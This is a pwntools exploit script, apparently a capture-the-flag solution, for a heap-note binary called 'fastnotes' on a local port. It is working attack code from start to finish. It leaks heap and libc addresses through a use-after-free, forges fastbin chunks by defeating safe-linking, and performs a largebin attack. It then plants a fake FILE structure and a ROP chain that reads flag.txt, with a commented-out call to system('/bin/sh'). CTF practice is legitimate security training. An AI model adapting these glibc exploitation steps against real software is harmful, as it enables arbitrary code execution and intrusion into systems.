from pwn import *

elf=context.binary=ELF("./fastnotes_patched")
libc=ELF("./libc.so.6")
#p=process()
#gdb.attach(p)
p=remote("127.0.0.1",8000)
def create(size,data):
    p.recvuntil(b"Notes\n")
    p.sendline(b"1")
    p.sendline(str(size).encode('utf-8'))
    p.sendline(data)

def free(idx):
    p.recvuntil(b"Notes\n")
    p.sendline(b'4')
    p.sendline(str(idx).encode('utf-8'))

def view(idx):
    p.recvuntil(b"Notes\n")
    p.sendline(b'3')
    p.sendline(str(idx).encode('utf-8'))

def write(idx,data):
    p.recvuntil(b"Notes\n")
    p.sendline(b'2')
    p.sendline(str(idx).encode('utf-8'))
    p.sendline(data)

def callSpecialChunk(): 
    p.recvuntil(b"Notes\n")
    p.sendline(b'5')
    p.sendline(b"asad")

def encrypt(pos,ptr):
    return (pos>>12)^ptr

#### FILL UP THE TCACHE BIN FOR 0x50 ####
for i in range(7):
    create(0x40,"empty")

#### THIS WILL BE OUR CHUNK 0 ####
create(0x40,"FAST:")
#### CREATE PADDING BETWEEN CHUNK 0 AND TOP CHUNK #####
for i in range(3):
    create(0x60,"empty")
#### THIS ADDS EXTRA PADDING ####
create(0x30,"empty")

free(0)
#### VIEW LEAKED HEAP PTR FOR CHUNK 0 ####
view(0)
#### DECRYPT HEAP PTR FOR CHUNK 0 ####
c=(u64(p.recvuntil(b"Choose")[:-6].ljust(8,b"\x00"))<<12)|(0x6a0+0x20)
#### LOCATION FOR OUR FAKE CHUNK #####
chunk_1_large=c+0x20
print(hex(c))
d=c

#### FILL UP TCAACHE BIN FOR 0x60 #####
for i in range(7):
    create(0x50,"empty")
#### THIS, i think, PREVENTS merging with top chunk when we free our fake chunk ####
create(0x10,"FAST:")
#### This will be our chunk 1 ####
create(0x50,"FAST:")

#### create fake chunk entry in fastbin by manipulating next #####
write(0,p64(encrypt(c,c+0x20))+p64(0x0)*2+p64(0x51)+p64(encrypt(c+0x20,0)))
create(0x40,"FAST:") 
#### calloc will null out the chunk so do it again ####
write(0,p64(encrypt(c,c+0x20))+p64(0x0)*2+p64(0x51)+p64(encrypt(c+0x20,0)))
#### our fake chunk is returned  #####
create(0x40,"FAST:") 
#### since chunk 0 and fake chunk are overlapping, craft the appropriate headers for fake chunk by writing to chunk 0 ####
#### fake chunk's size should be appropriate to free into unsored bin --> large bin and appropriate for a largebin attack ####
#### it should end at the 0x20 (0x10+0x10 (headers)) chunk we create to prevent merging ####
write(0,b"A"*(0x50-0x40)+p64(0x0)+p64((0x8f0-(0x40*6)-(0x30*7)-(0x70*4))|0x1)+p64(0x11111))


free(2) ###chunk 1 
view(2) #### view chunk 1 address

###repeat the same steps as the previous fake chunk setup to set up the second fake chunk ####
### this will bee necessary for largebin attack ####

c=(u64(p.recvuntil(b"Choose")[:-6].ljust(8,b"\x00"))<<12)|(0x920+0x40+0x1e0+0x20)
for i in range(7):
    create(0x80,"empty")

write(2,p64(encrypt(c,c+0x30))+p64(0x0)*4+p64(0x61)+p64(encrypt(c+0x30,0)))
create(0x50,"FAST:") 
write(2,p64(encrypt(c,c+0x30))+p64(0x0)*4+p64(0x61)+p64(encrypt(c+0x30,0)))
create(0x50,"FAST:") 
write(2,b"A"*(0x60-0x40)+p64(0x0)+p64((0x440)|0x1)+p64(0x11111))

create(0x10,"FAST:") 
create(0x10,"FAST:")

print(hex(c))

free(4)
view(4)
libc_leak=(u64(p.recvuntil(b"Choose")[:-6].ljust(8,b"\x00")))
print(hex(libc_leak))
libc.address=libc_leak-0x1dbb20
print(hex(libc.address))
callSpecialChunk()
free(6) #### view largebin_fd/largebin_bk (they should be the same) pointers ####
view(4)
largebin_bk=(u64(p.recvuntil(b"Choose")[:-6].ljust(8,b"\x00")))
print(hex(largebin_bk))
print(hex(chunk_1_large))
print(hex(libc.sym['system']))
fp_addr=d-0x430
ptr_to_fp_addr=d-0x430+0x1f0
print(hex(fp_addr))
print(hex(libc.address+0x1dc4e0-0x40))
payload=p64(largebin_bk)*2+p64(chunk_1_large)+p64(ptr_to_fp_addr-0x20) #### prepare for largebin attack ####
write(4,payload)
callSpecialChunk() #### trigger largebin attack #####
##we control fp at chunk 4



fake_stderr_chunk=chunk_1_large+0x4b0
fake_stdout_chunk=fake_stderr_chunk+0xe0

fs=FileStructure(0)
fs.fileno=3
fs.flags=u64(b'   sh\x00\x00\x00')
fs._IO_read_ptr=fake_stdout_chunk-0x10
fs._IO_read_base=fake_stderr_chunk+0xe0
fs._IO_write_base=0
fs._IO_write_ptr=libc.sym['setcontext']+61-0x28000
fs.vtable=libc.sym['_IO_wfile_jumps']-0x28000-0x20
fs._wide_data=fake_stderr_chunk+0x8
fs._lock=0x12c0+libc.sym['_IO_2_1_stderr_']-0x28000
fs.chain=libc.address+0x000000000016c477-0x28000 
fs.unknown2=u64(b'flag.txt')# loads [rdi+0x8] (stdout-0x10) into rax, calls stdout+0x10
#libc + 0x116c77 is mov rdx, rax ; call qword ptr [rbx + 0x28]
##second part
POP_RDI=libc.address+0x000000000010f75b-0x28000
POP_RSI=libc.address+0x0000000000110a4d-0x28000
POP_RDX=libc.address+0x00000000000981ad-0x28000
POP_RBP=libc.address+0x0000000000028a91-0x28000
RET=libc.address+0x000000000002882f-0x28000
bin_sh=libc.address+0x1cb42f-0x28000
payload2=p64(libc.address+0x00000000001303d5-0x28000)
rop_chain=p64(RET)+p64(POP_RDI)+p64(fake_stderr_chunk+0xd8-0x30)+p64(POP_RSI)+p64(0X2)+p64(libc.sym['open']-0x28000)
rop_chain+=p64(POP_RBP)+p64(fake_stderr_chunk+0xf0+len(rop_chain)+0x38+0x18)+p64(POP_RDX)+p64(0x100) 
payload2+=rop_chain
payload2+=p64(0x0)*(0x28//8)+p64(fake_stdout_chunk+0x18)+p64(RET) ## stdout+0x10
payload2+=p64(POP_RDI)+p64(0x4)+p64(POP_RSI)+p64(c)+p64(libc.sym['read']-0x28000)
payload2+=p64(POP_RDI)+p64(0x1)+p64(libc.sym['write']-0x28000)
#payload2+=p64(POP_RDI)+p64(bin_sh)+p64(libc.sym['system']-0x28000)
payload=bytes(fs)+p64(0xfbad2a84)+p64(fake_stderr_chunk)+payload2 ## fake_stderr_chunk+0xf0 is where payload 2 starts
print(hex(len(payload)))
sleep(1)
p.sendline(b"6") 
p.recvuntil(b"Why not you edit 1 more note?\n")
p.sendline(b"6")

p.sendline(payload)
#p.sendline(payload)
#p.sendline("cat flag.txt")
p.interactive()
